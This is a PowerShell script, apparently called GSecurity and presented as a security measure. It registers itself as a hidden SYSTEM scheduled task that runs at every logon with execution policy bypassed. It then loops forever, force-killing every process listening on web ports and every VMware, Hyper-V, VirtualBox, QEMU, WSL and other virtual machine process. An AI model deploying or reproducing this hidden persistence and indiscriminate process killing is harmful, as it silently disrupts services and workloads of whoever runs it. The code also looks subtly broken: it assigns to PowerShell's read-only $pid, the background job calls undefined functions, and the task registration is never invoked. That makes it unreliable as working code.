# Function to check if running as administrator
function Test-IsAdmin {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Function to create a Scheduled Task for this script
function Register-SelfAsScheduledTask {
    $TaskName = "GSecurityTask"
    $ScriptPath = $PSCommandPath # Gets the full path of the currently running script
    $TaskDescription = "Runs GSecurity.ps1 at user logon under SYSTEM account"

    # Check if the task already exists
    $taskExists = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    if ($taskExists) {
        Write-Output "Scheduled Task '$TaskName' already exists. Skipping creation."
        return
    }

    # Ensure the script file exists
    if (-not (Test-Path $ScriptPath)) {
        Write-Error "Script not found at $ScriptPath."
        return
    }

    # Define the action: Run PowerShell with hidden window
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`""

    # Define the trigger: At logon of any user
    $Trigger = New-ScheduledTaskTrigger -AtLogon

    # Define the principal: Run as SYSTEM
    $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest

    # Define settings: Ensure the task runs even if on battery, restarts if it fails, etc.
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)

    # Create the scheduled task
    try {
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Description $TaskDescription -Force | Out-Null
        Write-Output "Scheduled Task '$TaskName' created successfully."
    } catch {
        Write-Error "Failed to create Scheduled Task: $_"
    }
}

function Kill-ProcessesOnPorts {
    $ports = @(80, 443, 8080, 8888)
    $connections = Get-NetTCPConnection -State Listen | Where-Object { $_.LocalPort -in $ports }
    foreach ($conn in $connections) {
        $pid = $conn.OwningProcess
        Stop-Process -Id $pid -Force
    }
}

function Stop-AllVMs {
    # Expanded list of VM-related process names
    $vmProcesses = @(
        # VMware-related processes
        "vmware-vmx",     # VMware VM executable
        "vmware",         # VMware Workstation/Player main process
        "vmware-tray",    # VMware tray icon
        "vmwp",           # VMware Worker Process
        "vmnat",          # VMware Network Address Translation
        "vmnetdhcp",      # VMware DHCP service
        "vmware-authd",   # VMware Authentication Daemon
        "vmware-usbarbitrator", # VMware USB Arbitrator
        # Hyper-V-related processes
        "vmms",           # Hyper-V Virtual Machine Management Service
        "vmcompute",      # Hyper-V Host Compute Service
        "vmsrvc",         # Hyper-V Virtual Machine Service
        "vmwp",           # Hyper-V Worker Process (also used by VMware, context-dependent)
        "hvhost",         # Hyper-V Host Service
        "vmmem",          # Hyper-V Memory Manager (used by WSL2 VMs too)
        # VirtualBox-related processes
        "VBoxSVC",        # VirtualBox Service
        "VBoxHeadless",   # VirtualBox Headless VM Process
        "VirtualBoxVM",   # VirtualBox VM Process (newer versions)
        "VBoxManage",     # VirtualBox Management Interface
        # QEMU/KVM-related processes
        "qemu-system-x86_64", # QEMU x86_64 emulator
        "qemu-system-i386",   # QEMU i386 emulator
        "qemu-system-arm",    # QEMU ARM emulator
        "qemu-system-aarch64",# QEMU ARM64 emulator
        "kvm",            # Kernel-based Virtual Machine (generic)
        "qemu-kvm",       # QEMU with KVM acceleration
        # Parallels-related processes
        "prl_client_app", # Parallels Client Application
        "prl_cc",         # Parallels Control Center
        "prl_tools_service", # Parallels Tools Service
        "prl_vm_app",     # Parallels VM Application
        # Other virtualization platforms
        "bhyve",          # FreeBSD Hypervisor (bhyve VM process)
        "xen",            # Xen Hypervisor generic process
        "xenservice",     # XenService for XenServer
        "bochs",          # Bochs Emulator
        "dosbox",         # DOSBox (emulator often used for legacy VMs)
        "utm",            # UTM (macOS virtualization tool based on QEMU)
        # Windows Subsystem for Linux (WSL) and related
        "wsl",            # WSL main process
        "wslhost",        # WSL Host process
        "vmmem",          # WSL2 VM memory process (shared with Hyper-V)
        # Miscellaneous or niche VM tools
        "simics",         # Simics Simulator
        "vbox",           # Older VirtualBox process shorthand
        "parallels"     # Parallels generic process shorthand
)
         $processes = Get-Process
        $vmRunning = $processes | Where-Object { $vmProcesses -contains $_.Name }
        if ($vmRunning) {
            $vmRunning | Format-Table -Property Id, Name, Description -AutoSize
            foreach ($process in $vmRunning) {
                Stop-Process -Id $process.Id -Force
            }
      }
}
    
    Start-Job -ScriptBlock {
    while ($true) {
        Stop-AllVMs
        Kill-ProcessesOnPorts
    }
}